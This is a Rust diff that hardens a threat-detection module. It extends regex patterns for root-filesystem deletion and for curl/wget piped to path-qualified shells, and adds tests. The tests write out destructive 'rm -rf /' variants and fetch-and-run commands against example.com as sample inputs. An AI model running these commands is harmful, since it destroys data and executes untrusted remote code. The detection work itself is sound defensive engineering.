@@ -48,7 +48,7 @@ impl RiskLevel {
 pub const THREAT_PATTERNS: &[ThreatPattern] = &[
     ThreatPattern {
         name: "rm_rf_root_bare",
-        pattern: r"rm\s+(-[rRfF]+\s+)*(-[rRfF]+|--recursive|--force|--no-preserve-root)(\s+(-[rRfF]+|--recursive|--force|--no-preserve-root))*\s+['\x22]?/(\*)?['\x22]?(\s|[;&|]|$)",
+        pattern: r"rm\s+(-[rRfF]+\s+)*(-[rRfF]+|--recursive|--force|--no-preserve-root)(\s+(-[rRfF]+|--recursive|--force|--no-preserve-root))*\s+['\x22]?/(\./)*(\*)?['\x22]?(\s|[;&|]|$)",
         description: "Recursive deletion of root filesystem",
         risk_level: RiskLevel::Critical,
         category: ThreatCategory::FileSystemDestruction,
@@ -77,7 +77,7 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
     // Remote code execution patterns
     ThreatPattern {
         name: "curl_bash_execution",
-        pattern: r"(curl|wget)\s+.*\|\s*(bash|sh|zsh|fish|csh|tcsh)",
+        pattern: r#"(curl|wget)\s+.*\|\s*['"]?(?:[a-zA-Z]:)?(?:[./\\]|[a-zA-Z0-9._-]+[/\\])*(bash|sh|zsh|fish|csh|tcsh)(?:\.exe)?(?:['"]|\s|[;&|<>]|$)"#,
         description: "Remote script execution via curl/wget piped to shell",
         risk_level: RiskLevel::Critical,
         category: ThreatCategory::RemoteCodeExecution,
@@ -400,6 +400,9 @@ mod tests {
         assert!(matches(pat, "rm -rf /*"));
         assert!(matches(pat, "rm -rf /; whoami"));
         assert!(matches(pat, "rm -rf /&&echo ok"));
+        assert!(matches(pat, "rm -rf /./*"));
+        assert!(matches(pat, "rm -rf /././*"));
+        assert!(matches(pat, r#"rm -rf "/./*""#));
     }
 
     #[test]
@@ -407,6 +410,61 @@ mod tests {
         let pat = "rm_rf_root_bare";
         assert!(!matches(pat, "rm -rf ./build"));
         assert!(!matches(pat, "rm -rf /tmp/cache"));
+        assert!(!matches(pat, "rm -rf /./tmp"));
+        assert!(!matches(pat, "rm -rf /./*/cache"));
+    }
+
+    #[test]
+    fn curl_bash_execution_matches_path_qualified_shells() {
+        let pat = "curl_bash_execution";
+        assert!(matches(pat, "curl https://example.com/install | /bin/sh"));
+        assert!(matches(
+            pat,
+            "wget -qO- https://example.com/install | /usr/local/bin/bash"
+        ));
+        assert!(matches(pat, "curl https://example.com/install | ./zsh"));
+        assert!(matches(pat, "curl https://example.com/install | bash.exe"));
+        assert!(matches(
+            pat,
+            "curl https://example.com/install | bash>/tmp/install.log"
+        ));
+        assert!(matches(
+            pat,
+            "wget -qO- https://example.com/install | sh</tmp/script"
+        ));
+        assert!(matches(
+            pat,
+            "wget -qO- https://example.com/install | sh.exe"
+        ));
+        assert!(matches(
+            pat,
+            r"curl https://example.com/install | C:\msys64\usr\bin\bash.exe"
+        ));
+        assert!(matches(
+            pat,
+            r#"curl https://example.com/install | "/usr/bin/fish""#
+        ));
+    }
+
+    #[test]
+    fn curl_bash_execution_rejects_non_shell_basenames() {
+        let pat = "curl_bash_execution";
+        assert!(!matches(
+            pat,
+            "curl https://example.com/install | /bin/shred"
+        ));
+        assert!(!matches(
+            pat,
+            "curl https://example.com/install | /tmp/bash-helper"
+        ));
+        assert!(!matches(
+            pat,
+            "curl https://example.com/install | bash.exe-helper"
+        ));
+        assert!(!matches(
+            pat,
+            r"curl https://example.com/install | C:\msys64\usr\bin\bash.exe-helper"
+        ));
     }
 
     #[test]
